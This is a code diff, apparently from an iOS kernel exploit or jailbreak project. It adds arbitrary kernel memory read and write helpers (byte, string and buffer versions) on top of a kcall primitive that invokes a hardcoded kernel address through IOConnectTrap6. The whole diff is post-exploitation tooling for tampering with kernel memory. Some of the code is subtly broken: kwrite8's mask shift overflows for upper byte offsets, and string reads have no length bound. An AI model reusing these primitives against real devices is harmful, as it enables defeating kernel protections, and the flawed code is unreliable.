@@ -40,6 +40,10 @@ uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3
     return IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, x6);
 }
 
+uint8_t kread8(uint64_t addr) {
+    return (uint8_t)kcall(0xFFFFFFF009446D08 + get_kernel_slide(), 0, addr, 0, 0, 0, 0);
+}
+
 uint32_t kread32(uint64_t addr) {
     return (uint32_t)kcall(0xFFFFFFF009446D08 + get_kernel_slide(), 0, addr, 0, 0, 0, 0);
 }
@@ -49,6 +53,19 @@ uint64_t kread64(uint64_t addr) {
     uint32_t high32 = kread32(addr + 0x4);
     uint64_t ret = (((uint64_t)high32) << 32) | low32;
     return ret;
+}
+
+void kread_string(uint64_t addr, char *out) {
+    while (true) {
+        uint64_t val = kread64(addr);
+        for (int i = 0; i < 8; i++) {
+            out[i] = (val >> (i * 8)) & 0xFF;
+            if (out[i] == '\0') {
+                return;
+            }
+        }
+        addr += 8;
+    }
 }
 
 uint64_t kalloc(size_t ksize) {
@@ -68,4 +85,25 @@ void kwrite32(uint64_t addr, uint32_t data) {
     uint32_t low32 = data;
     uint32_t high32 = kread32(addr + 0x4);
     kwrite64(addr, (((uint64_t)high32) << 32) | low32);
+}
+
+static void kwrite8(uint64_t addr, uint8_t data) {
+    uint64_t val = kread64(addr);
+    val &= ~(0xFF << ((addr % 8) * 8));
+    val |= ((uint64_t)data) << ((addr % 8) * 8);
+    kwrite64(addr, val);
+}
+
+void kwritebuf(uint64_t addr, void *buf, size_t size) {
+    uint8_t *bytes = (uint8_t *)buf;
+    for (int i = 0; i < size; i++) {
+        kwrite8(addr + i, bytes[i]);
+    }
+}
+
+void kreadbuf(uint64_t addr, void *buf, size_t size) {
+    uint8_t *bytes = (uint8_t *)buf;
+    for (int i = 0; i < size; i++) {
+        bytes[i] = kread8(addr + i);
+    }
 }
